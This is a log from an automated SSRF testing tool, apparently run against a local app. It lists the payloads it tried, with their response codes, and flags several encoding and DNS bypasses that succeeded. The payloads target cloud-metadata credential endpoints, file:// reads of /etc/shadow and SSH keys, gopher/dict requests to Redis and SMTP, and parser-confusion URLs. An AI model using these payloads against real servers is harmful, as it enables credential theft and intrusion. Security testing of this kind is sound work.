+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://vcap.me/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: Parser confusion: http://evil.com@127.0.0.1/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1@evil.com/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1#@evil.com/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1?@evil.com/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Case variation: http://LOCALHOST/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Case variation: http://LocalHost/ - Status: 415
+[2025-10-26 23:00:14] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/../ - Status: 415
+[2025-10-26 23:00:14] [INFO] Completed Bypass Techniques: 0/28 vulnerabilities found
+[2025-10-26 23:00:15] [INFO] Validating security controls...
+[2025-10-26 23:00:15] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Gopher protocol blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Allowed external URL - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Allowed API endpoint - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: File protocol blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Dict protocol blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Localhost blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: FTP protocol blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Phar protocol blocking - Status: 415
+[2025-10-26 23:00:17] [INFO] ✅ Tested: Data URI blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: Localhost hostname blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: RFC 1918 blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: Private class B blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: Link-local blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: Private class A blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] ✅ Tested: All zeros blocking - Status: 415
+[2025-10-26 23:00:19] [INFO] Completed Security Control Validation: 0/16 vulnerabilities found
+[2025-10-26 23:00:20] [INFO] Starting internal network scanning...
+[2025-10-26 23:00:54] [INFO] Generating comprehensive report...
+[2025-10-26 23:00:54] [ERROR] Unexpected error: 'total_tests'
+[2025-10-26 23:18:30] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 23:18:30] [INFO] Starting internal service enumeration...
+[2025-10-26 23:18:30] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 500
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://127.0.0.1/ - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 500
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://127.0.0.1:80/ - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Router admin interface - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Internal network gateway - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://localhost/ - Status: 403
+[2025-10-26 23:18:32] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Corporate network - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: GCP Metadata service - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: AWS Metadata service - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Common router IP - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Internal network - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Localhost port 80 - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Local port 80 - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Local port 443 - Status: 403
+[2025-10-26 23:18:34] [INFO] ✅ Tested: Localhost port 443 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Local port 8080 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Local port 8000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Localhost port 8000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Localhost port 8080 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Localhost port 3000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Local port 3000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Localhost port 5000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Local port 5000 - Status: 403
+[2025-10-26 23:18:36] [INFO] ✅ Tested: Local port 9000 - Status: 403
+[2025-10-26 23:18:38] [INFO] ✅ Tested: Localhost port 9000 - Status: 403
+[2025-10-26 23:18:44] [ERROR] ❌ Error: Alibaba Cloud metadata - Timeout
+[2025-10-26 23:18:44] [INFO] Completed Internal Service Enumeration: 0/30 vulnerabilities found
+[2025-10-26 23:18:45] [INFO] Testing cloud metadata service access...
+[2025-10-26 23:18:45] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/user-data/ - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Status: 403
+[2025-10-26 23:18:47] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Status: 403
+[2025-10-26 23:18:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 403
+[2025-10-26 23:18:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 403
+[2025-10-26 23:18:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 403
+[2025-10-26 23:18:49] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Status: 403
+[2025-10-26 23:18:49] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Status: 403
+[2025-10-26 23:18:49] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/instance - Status: 403
+[2025-10-26 23:18:49] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/attested/document - Status: 403
+[2025-10-26 23:18:50] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Status: 403
+[2025-10-26 23:18:50] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 23:18:51] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 23:18:51] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///c:/windows/win.ini - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///c:/windows/system32/drivers/etc/hosts - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 403
+[2025-10-26 23:18:53] [INFO] ✅ Tested: File protocol: file://test_file.txt - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:6379/_INFO - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:6379/_KEYS%20* - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0 - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 403
+[2025-10-26 23:18:55] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Dict protocol: dict://localhost:6379/info - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Dict protocol: dict://192.168.1.1:80/ - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Dict protocol: dict://127.0.0.1:11211/stats - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Phar protocol: phar:///etc/passwd - Status: 403
+[2025-10-26 23:18:57] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 403
+[2025-10-26 23:18:57] [INFO] Completed Protocol-Based Attacks: 0/27 vulnerabilities found
+[2025-10-26 23:18:58] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 23:18:58] [INFO] Running Bypass Techniques - 28 test cases...
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 403
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 403
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 403
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 403
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 500
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 500
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 500
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 500
+[2025-10-26 23:19:00] [CRITICAL] 🚨 VULNERABILITY FOUND: IP encoding: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:19:00] [CRITICAL]     URL: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:19:00] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:19:00] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 403
+[2025-10-26 23:19:02] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 500
+[2025-10-26 23:19:02] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 403
+[2025-10-26 23:19:02] [INFO] ✅ Tested: Parser confusion: http://evil.com@127.0.0.1/ - Status: 403
+[2025-10-26 23:19:02] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://127.0.0.1.nip.io/
+[2025-10-26 23:19:02] [CRITICAL]     URL: http://127.0.0.1.nip.io/
+[2025-10-26 23:19:02] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:19:02] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://localtest.me/
+[2025-10-26 23:19:02] [CRITICAL]     URL: http://localtest.me/
+[2025-10-26 23:19:02] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:19:02] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 500
+[2025-10-26 23:19:02] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 403
+[2025-10-26 23:19:02] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://lvh.me/
+[2025-10-26 23:19:02] [CRITICAL]     URL: http://lvh.me/
+[2025-10-26 23:19:02] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:19:02] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1@evil.com/
+[2025-10-26 23:19:02] [CRITICAL]     URL: http://127.0.0.1@evil.com/
+[2025-10-26 23:19:02] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:19:03] [INFO] ✅ Tested: DNS trick: http://vcap.me/ - Status: 200
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1#@evil.com/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1?@evil.com/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Case variation: http://LocalHost/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Case variation: http://LOCALHOST/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 403
+[2025-10-26 23:19:04] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/../ - Status: 403
+[2025-10-26 23:19:04] [INFO] Completed Bypass Techniques: 5/28 vulnerabilities found
+[2025-10-26 23:19:05] [INFO] Validating security controls...
+[2025-10-26 23:19:05] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 23:19:07] [INFO] ✅ Tested: Dict protocol blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: File protocol blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: Gopher protocol blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: FTP protocol blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: Phar protocol blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: Data URI blocking - Status: 403
+[2025-10-26 23:19:07] [INFO] ✅ Tested: Localhost blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: RFC 1918 blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: Localhost hostname blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: Private class A blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: Private class B blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: Link-local blocking - Status: 403
+[2025-10-26 23:19:09] [INFO] ✅ Tested: Allowed API endpoint - Status: 200
+[2025-10-26 23:19:09] [INFO] ✅ Tested: All zeros blocking - Status: 403
+[2025-10-26 23:19:10] [INFO] ✅ Tested: Allowed external URL - Status: 200
+[2025-10-26 23:19:11] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 200
+[2025-10-26 23:19:11] [INFO] Completed Security Control Validation: 0/16 vulnerabilities found
+[2025-10-26 23:19:12] [INFO] Starting internal network scanning...
+[2025-10-26 23:19:45] [INFO] Generating comprehensive report...
+[2025-10-26 23:19:45] [ERROR] Unexpected error: 'total_tests'
+[2025-10-26 23:26:51] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 23:26:51] [INFO] Starting internal service enumeration...
+[2025-10-26 23:26:51] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://localhost/ - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 500
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 500
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Internal network gateway - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://127.0.0.1:80/ - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Router admin interface - Status: 403
+[2025-10-26 23:26:53] [INFO] ✅ Tested: Localhost access: http://127.0.0.1/ - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Corporate network - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: GCP Metadata service - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Common router IP - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: AWS Metadata service - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Localhost port 80 - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Local port 80 - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Internal network - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Local port 443 - Status: 403
+[2025-10-26 23:26:55] [INFO] ✅ Tested: Localhost port 443 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Local port 8080 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Local port 8000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Localhost port 8080 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Localhost port 8000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Local port 3000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Localhost port 3000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Local port 5000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Localhost port 5000 - Status: 403
+[2025-10-26 23:26:57] [INFO] ✅ Tested: Local port 9000 - Status: 403
+[2025-10-26 23:26:59] [INFO] ✅ Tested: Localhost port 9000 - Status: 403
+[2025-10-26 23:27:05] [ERROR] ❌ Error: Alibaba Cloud metadata - Timeout
+[2025-10-26 23:27:05] [INFO] Completed Internal Service Enumeration: 0/30 vulnerabilities found
+[2025-10-26 23:27:06] [INFO] Testing cloud metadata service access...
+[2025-10-26 23:27:06] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/user-data/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Status: 403
+[2025-10-26 23:27:08] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 403
+[2025-10-26 23:27:10] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/instance - Status: 403
+[2025-10-26 23:27:10] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Status: 403
+[2025-10-26 23:27:10] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/attested/document - Status: 403
+[2025-10-26 23:27:10] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Status: 403
+[2025-10-26 23:27:10] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Status: 403
+[2025-10-26 23:27:10] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 23:27:11] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 23:27:11] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///c:/windows/win.ini - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file://test_file.txt - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 403
+[2025-10-26 23:27:13] [INFO] ✅ Tested: File protocol: file:///c:/windows/system32/drivers/etc/hosts - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:6379/_INFO - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:6379/_KEYS%20* - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0 - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 403
+[2025-10-26 23:27:15] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Dict protocol: dict://127.0.0.1:11211/stats - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Dict protocol: dict://localhost:6379/info - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Dict protocol: dict://192.168.1.1:80/ - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 403
+[2025-10-26 23:27:17] [INFO] ✅ Tested: Phar protocol: phar:///etc/passwd - Status: 403
+[2025-10-26 23:27:17] [INFO] Completed Protocol-Based Attacks: 0/27 vulnerabilities found
+[2025-10-26 23:27:18] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 23:27:18] [INFO] Running Bypass Techniques - 26 test cases...
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 403
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 403
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 500
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 500
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 403
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 500
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 403
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 403
+[2025-10-26 23:27:20] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 500
+[2025-10-26 23:27:20] [CRITICAL] 🚨 VULNERABILITY FOUND: IP encoding: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:27:20] [CRITICAL]     URL: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:27:20] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:27:22] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 500
+[2025-10-26 23:27:22] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: DNS trick: http://lvh.me/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 500
+[2025-10-26 23:27:22] [INFO] ✅ Tested: Parser confusion: http://evil.com@127.0.0.1/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: DNS trick: http://localtest.me/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: DNS trick: http://127.0.0.1.nip.io - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1#@evil.com/ - Status: 403
+[2025-10-26 23:27:22] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1?@evil.com/ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Case variation: http://LocalHost/ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Case variation: http://LOCALHOST/ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/../ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 403
+[2025-10-26 23:27:24] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 403
+[2025-10-26 23:27:24] [INFO] Completed Bypass Techniques: 1/26 vulnerabilities found
+[2025-10-26 23:27:25] [INFO] Validating security controls...
+[2025-10-26 23:27:25] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 23:27:27] [INFO] ✅ Tested: File protocol blocking - Status: 403
+[2025-10-26 23:27:27] [INFO] ✅ Tested: Dict protocol blocking - Status: 403
+[2025-10-26 23:27:27] [INFO] ✅ Tested: Data URI blocking - Status: 403
+[2025-10-26 23:27:27] [INFO] ✅ Tested: Gopher protocol blocking - Status: 403
+[2025-10-26 23:27:27] [INFO] ✅ Tested: FTP protocol blocking - Status: 403
+[2025-10-26 23:27:27] [INFO] ✅ Tested: Localhost blocking - Status: 403
